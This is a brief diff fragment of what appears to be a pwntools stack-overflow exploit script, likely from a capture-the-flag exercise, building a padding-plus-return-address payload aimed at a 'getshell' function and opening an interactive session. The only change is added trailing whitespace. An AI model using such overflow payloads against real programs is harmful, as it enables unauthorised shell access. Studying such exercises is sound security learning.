@@ -23,7 +23,7 @@ payload = b'a' * padding + p32(getshell_code)
 # padding = 0xF + 8                 # 偏移量, 64位程序
 # payload = b'a' * padding + p64(getshell_code)
 
-io.sendline(payload)
+io.sendline(payload) 
 
 io.interactive()
 
